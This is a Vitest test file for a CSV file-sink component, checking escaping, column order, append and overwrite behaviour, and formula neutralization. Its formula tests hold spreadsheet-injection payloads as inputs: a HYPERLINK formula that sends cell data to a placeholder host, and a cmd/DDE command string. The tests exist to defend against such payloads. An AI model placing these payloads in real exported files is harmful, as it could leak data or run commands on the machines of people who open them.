/**
 * Fox Schema (foxschema)
 * Copyright 2024-2026 Huy Phan <huyplb@gmail.com>
 * SPDX-License-Identifier: Apache-2.0
 *
 * Workflow engine — moved from FoxAgent (packages/pipes/utility/src/file-sink.test.ts).
 */
import { mkdtemp, readFile, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { FileSinkPipe, escapeField } from './file-sink.js';
import type { PipeContext, RecordBatch } from '../../registry/index.js';

/**
 * Writing a spreadsheet is one of those jobs where a bug does not throw — it
 * produces a file that opens with the columns quietly shifted, and someone
 * finds it a month later in a report. So the escaping cases get their own
 * tests, and the file-level behaviour is checked by reading the bytes back.
 */

function contextFor(config: unknown, runId = 'run-1'): PipeContext {
  return {
    workflowRunId: runId,
    pipelineId: 'main',
    pipe: { id: 'out', type: 'sink.file.delimited', role: 'sink', config },
  } as never;
}

function batch(records: Record<string, unknown>[]): RecordBatch {
  return { records } as never;
}

async function tempPath(name = 'out.csv'): Promise<string> {
  return join(await mkdtemp(join(tmpdir(), 'foxflow-sink-')), name);
}

describe('escaping a field', () => {
  it('quotes a value containing the delimiter', () => {
    // Unquoted, "Acme, Inc" becomes two columns and every later column shifts.
    expect(escapeField('Acme, Inc', ',', '\n')).toBe('"Acme, Inc"');
  });

  it('doubles embedded quotes rather than escaping them with a backslash', () => {
    // RFC 4180, which is what spreadsheets actually implement.
    expect(escapeField('He said "no"', ',', '\n')).toBe('"He said ""no"""');
  });

  it('quotes a value containing a newline', () => {
    // A call note with a line break would otherwise end the row early.
    expect(escapeField('line one\nline two', ',', '\n')).toBe(
      '"line one\nline two"',
    );
  });

  it('writes an empty cell for null and undefined, not the words', () => {
    expect(escapeField(null, ',', '\n')).toBe('');
    expect(escapeField(undefined, ',', '\n')).toBe('');
  });

  it('leaves an ordinary value alone', () => {
    expect(escapeField('Acme Inc', ',', '\n')).toBe('Acme Inc');
  });
});

describe('formulas in a field', () => {
  // A source row is data anyone may have typed. Opened in a spreadsheet, a
  // cell starting with = + - @ (or a tab/CR) runs as a formula, quoted or not.
  it('turns text a spreadsheet would run into text, with a leading quote', () => {
    expect(escapeField('=HYPERLINK("http://x/?"&A1,"open")', ',', '\n')).toBe(
      `"'=HYPERLINK(""http://x/?""&A1,""open"")"`,
    );
    expect(escapeField("+cmd|' /C calc'!A0", ',', '\n')).toBe("'+cmd|' /C calc'!A0");
    expect(escapeField('@SUM(A1:A9)', ',', '\n')).toBe("'@SUM(A1:A9)");
    expect(escapeField('-2+3', ',', '\n')).toBe("'-2+3");
    expect(escapeField('\t=1+1', ',', '\n')).toBe("'\t=1+1");
    // A leading space is not a barrier: spreadsheets skip it and still run the formula.
    expect(escapeField(' =HYPERLINK("http://x")', ',', '\n')).toBe(`"' =HYPERLINK(""http://x"")"`);
  });

  it('leaves a number, signed or not, as a number', () => {
    // Drivers hand NUMERIC and BIGINT over as strings; a quote would make them text.
    for (const value of [-5, '-5.00', '+1.5e3', '-.5', 42, ' -5']) {
      expect(escapeField(value, ',', '\n')).toBe(String(value));
    }
  });

  it('writes the value as it is when the sink opts out', () => {
    expect(escapeField('=1+1', ',', '\n', false)).toBe('=1+1');
  });
});

describe('writing the file', () => {
  const config = (path: string, extra: Record<string, unknown> = {}) => ({
    path,
    columns: ['name', 'outcome'],
    ...extra,
  });

  it('writes a header and the rows, in declared column order', async () => {
    const path = await tempPath();
    const sink = new FileSinkPipe();

    await sink.write(
      // Deliberately reversed key order: the file must follow `columns`, not
      // whatever order the record's keys happen to be in.
      batch([{ outcome: 'callback', name: 'Dana' }]),
      contextFor(config(path)),
    );

    expect(await readFile(path, 'utf8')).toBe('name,outcome\nDana,callback\n');
  });

  it('neutralizes a formula in a row it writes, unless told not to', async () => {
    const path = await tempPath();
    await new FileSinkPipe().write(batch([{ name: '=HYPERLINK("http://x")', outcome: '-3' }]), contextFor(config(path)));
    expect(await readFile(path, 'utf8')).toBe(`name,outcome\n"'=HYPERLINK(""http://x"")",-3\n`);

    const raw = await tempPath();
    await new FileSinkPipe().write(
      batch([{ name: '=1+1', outcome: 'sold' }]),
      contextFor(config(raw, { escapeFormulas: false })),
    );
    expect(await readFile(raw, 'utf8')).toBe('name,outcome\n=1+1,sold\n');
  });

  it('appends across batches without repeating the header', async () => {
    const path = await tempPath();
    const sink = new FileSinkPipe();
    const ctx = contextFor(config(path));

    await sink.write(batch([{ name: 'Dana', outcome: 'sold' }]), ctx);
    await sink.write(batch([{ name: 'Ali', outcome: 'no answer' }]), ctx);

    // A sink is invoked once per batch; the header belongs to the file.
    expect(await readFile(path, 'utf8')).toBe(
      'name,outcome\nDana,sold\nAli,no answer\n',
    );
  });

  it('adds to yesterday rather than replacing it', async () => {
    const path = await tempPath();
    await writeFile(path, 'name,outcome\nOld,sold\n', 'utf8');

    await new FileSinkPipe().write(
      batch([{ name: 'Dana', outcome: 'callback' }]),
      contextFor(config(path)),
    );

    // The default is append precisely so the first scheduled run does not
    // silently destroy the previous day's file.
    expect(await readFile(path, 'utf8')).toBe(
      'name,outcome\nOld,sold\nDana,callback\n',
    );
  });

  it('truncates once per run when overwriting, not once per batch', async () => {
    const path = await tempPath();
    const sink = new FileSinkPipe();
    const ctx = contextFor(config(path, { mode: 'overwrite' }));

    await sink.write(batch([{ name: 'Dana', outcome: 'sold' }]), ctx);
    await sink.write(batch([{ name: 'Ali', outcome: 'callback' }]), ctx);

    // Truncating per batch would leave only the final chunk on disk.
    expect(await readFile(path, 'utf8')).toBe(
      'name,outcome\nDana,sold\nAli,callback\n',
    );
  });

  it('creates the directory rather than failing on a missing folder', async () => {
    const path = join(await tempPath('nested'), 'deep', 'out.csv');

    await new FileSinkPipe().write(
      batch([{ name: 'Dana', outcome: 'sold' }]),
      contextFor(config(path)),
    );

    expect(await readFile(path, 'utf8')).toContain('Dana,sold');
  });

  it('writes nothing at all for an empty batch', async () => {
    const path = await tempPath();

    // A header-only file for a day with no calls looks like data loss when
    // someone opens it; no rows means no file.
    await new FileSinkPipe().write(batch([]), contextFor(config(path)));

    await expect(readFile(path, 'utf8')).rejects.toThrow();
  });
});
